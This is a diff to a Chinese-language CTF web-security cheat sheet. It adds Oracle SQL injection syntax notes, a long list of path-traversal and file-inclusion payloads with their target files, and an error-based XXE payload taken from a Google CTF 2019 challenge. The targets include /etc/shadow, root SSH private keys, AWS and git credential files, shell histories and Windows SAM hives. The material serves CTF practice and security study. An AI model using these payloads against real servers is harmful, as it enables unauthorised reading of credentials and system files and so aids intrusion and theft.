@@ -1235,7 +1235,7 @@ pop graphic-context
 ## Oracle
 
 - `SELECT`語句必須包含`FROM`
-    - 用`dual`表
+    - 未指定來源，可以用`dual`表
 - 子字串：
     - `SUBSTR("abc", 1, 1) => 'a'`
 - 空白字元
@@ -1244,6 +1244,7 @@ pop graphic-context
     - `IF condition THEN true-part [ELSE false-part] END IF`
 - 註解：
     - `--`
+    - `/**/`
 - 其它
     - `SYS.DATABASE_NAME`
         - current database
@@ -1472,32 +1473,110 @@ HQL injection example (pwn2win 2017)
 
 ### Linux / Unix
 
-- `./index.php`
-- `././index.php`
-- `.//index.php`
-- `../../../../../../etc/passwd`
-- `../../../../../../etc/passwd%00`
-    - 僅在5.3.0以下可用
-    - magic_quotes_gpc需為OFF
-- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
-- `ＮＮ/ＮＮ/ＮＮ/etc/passwd`
-- `/var/log/apache2/error.log`
-- `/var/log/httpd/access_log`
-- `/var/log/mail.log`
-- `/usr/local/apache2/conf/httpd.conf`
-- `/etc/apache2/apache2.conf`
-- `/etc/apache2/httpd.conf`
-- `/etc/apache2/sites-available/000-default.conf`
-- `/usr/local/etc/apache2/httpd.conf`
-- `/etc/nginx/conf.d/default.conf`
-- `/etc/nginx/nginx.conf`
-- `/etc/nginx/sites-enabled/default`
-- `/etc/nginx/sites-enabled/default.conf`
-- `/proc/net/fib_trie`
-- `.htaccess`
-- `/root/.bash_history`
-- `/root/.ssh/id_rsa`
-- `/root/.ssh/authorized_keys`
+- Common Payload
+    - `./index.php`
+    - `././index.php`
+    - `.//index.php`
+    - `../../../../../../etc/passwd`
+    - `../../../../../../etc/passwd%00`
+        - 僅在5.3.0以下可用
+        - magic_quotes_gpc需為OFF
+    - `....//....//....//....//etc/passwd`
+    - `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
+    - `%252e/%252e/manager/html`
+    - `ＮＮ/ＮＮ/ＮＮ/etc/passwd`
+    - `.+./.+./.+./.+./.+./.+./.+./.+./.+./.+./etc/passwd`
+    - `static\..\..\..\..\..\..\..\..\etc\passwd`
+    
+- Config
+    - `/usr/local/apache2/conf/httpd.conf`
+    - `/usr/local/etc/apache2/httpd.conf`
+    - `/etc/apache2/sites-available/000-default.conf`
+    - `/etc/apache2/apache2.conf`
+    - `/etc/apache2/httpd.conf`
+    - `/etc/httpd/conf/httpd.conf`
+    - `/etc/nginx/conf.d/default.conf`
+    - `/etc/nginx/nginx.conf`
+    - `/etc/nginx/sites-enabled/default`
+    - `/etc/nginx/sites-enabled/default.conf`
+    - `/etc/mysql/my.cnf`
+    - `/etc/resolv.conf`
+    - `/etc/named.conf`
+    - `/etc/rsyslog.conf`
+    - `/etc/samba/smb.conf`
+    - `/etc/openldap/slapd.conf`
+    - `/etc/mongod.conf`
+    - `~/.tmux.conf`
+    - `$TOMCAT_HOME/conf/tomcat-users.xml`
+    - `$TOMCAT_HOME/conf/server.xml`
+
+- Log
+    - `/var/log/apache2/error.log`
+    - `/var/log/httpd/access_log`
+    - `/var/log/mail.log`
+    - `/var/log/auth.log`
+    - `/var/log/messages`
+    - `/var/log/secure`
+    - `/var/log/sshd.log`
+    - `/var/log/mysqld.log`
+    - `/var/log/mongodb/mongod.log`
+    - `$TOMCAT_HOME/logs/catalina.out`
+
+- History
+    - `.bash_history`
+    - `.sh_history`
+    - `.zsh_history`
+    - `.viminfo`
+    - `.php_history`
+    - `.mysql_history`
+    - `.histfile`
+    - `.node_repl_history`
+    - `.python_history`
+    - `.sqlite_history`
+    - `.psql_history`
+    - `.lesshst`
+    - `.wget-hsts`
+    - `.config/fish/fish_history`
+    - `.local/share/fish/fish_history`
+    - `.ipython/profile_default/history.sqlite`
+
+- 其他
+    - `/proc/self/cmdline`
+    - `/proc/self/fd/[0-9]*`
+    - `/proc/self/environ`
+    - `/proc/net/fib_trie`
+    - `/proc/mounts`
+    - `/proc/net/arp`
+    - `/proc/net/tcp`
+    - `/proc/sched_debug`
+    - `.htaccess`
+    - `~/.bashrc`
+    - `~/.bash_profile`
+    - `~/.bash_logout`
+    - `~/.zshrc`
+    - `~/.aws/config`
+    - `~/.aws/credentials`
+    - `~/.boto`
+    - `~/.gitconfig`
+    - `~/.config/git/config`
+    - `~/.git-credentials`
+    - `~/.env`
+    - `/etc/passwd`
+    - `/etc/shadow`
+    - `/etc/hosts`
+    - `/etc/rc.d/rc.local`
+    - `/etc/boto.cfg`
+    - `/root/.ssh/id_rsa`
+    - `/root/.ssh/authorized_keys`
+    - `/root/.ssh/known_hosts`
+    - `/root/.ssh/config`
+    - `/etc/sysconfig/network-scripts/ifcfg-eth0`
+    - `/etc/exports`
+    - `/etc/crontab`
+    - `/var/spool/cron/root`
+    - `/var/spool/cron/crontabs/root`
+    - `/var/mail/<username>`
+
 
 ### Windows
 
@@ -1505,7 +1584,20 @@ HQL injection example (pwn2win 2017)
 - `C:/boot.ini`
 - `C:/apache/logs/access.log`
 - `../../../../../../../../../boot.ini/.......................`
-- `C:/windows/system32/drivers/etc/hosts`
+- `%WINDIR%\System32\drivers\etc\hosts`
+- `C:\WINDOWS\System32\Config\SAM`
+- `C:/WINDOWS/repair/sam`
+- `C:/WINDOWS/repair/system`
+- `%SYSTEMROOT%\System32\config\RegBack\SAM`
+- `%SYSTEMROOT%\System32\config\RegBack\system`
+- `%WINDIR%\system32\config\AppEvent.Evt`
+- `%WINDIR%\system32\config\SecEvent.Evt`
+- `%WINDIR%\iis[version].log`
+- `%WINDIR%\debug\NetSetup.log`
+- `%SYSTEMDRIVE%\autoexec.bat`
+- `C:\Documents and Settings\All Users\Application Data\Git\config`
+- `C:\ProgramData\Git\config`
+
 
 ## 環境變數
 
@@ -2275,6 +2367,25 @@ xxe.dtd:
 ```
 
 - Example: MidnightSun CTF - Rubenscube
+
+
+## Error-based XXE
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE message[ 
+  <!ELEMENT message ANY >
+  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
+  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%NUMBER;
+]> 
+<message>a</message>
+```
+
+- Example: Google CTF 2019 Qual - bnv
 
 ## 其它
 
